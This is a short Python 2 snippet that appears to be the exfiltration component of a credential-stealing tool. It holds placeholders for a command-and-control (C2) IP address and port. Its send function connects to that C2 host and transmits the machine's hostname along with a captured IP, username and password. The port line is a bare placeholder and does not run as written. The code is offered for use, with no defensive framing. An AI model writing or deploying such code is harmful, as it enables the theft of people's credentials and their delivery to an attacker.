import socket

C2 = "YOUR C2 IP"
C2PORT = #YOUR PORT

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

def send(ip, usr, pw):
    try:
        s.connect((C2, C2PORT))
        s.send(socket.gethostname() + ": " + ip + " " + usr + " " + pw)
        s.close()
    except socket.error, ex:
        print ex
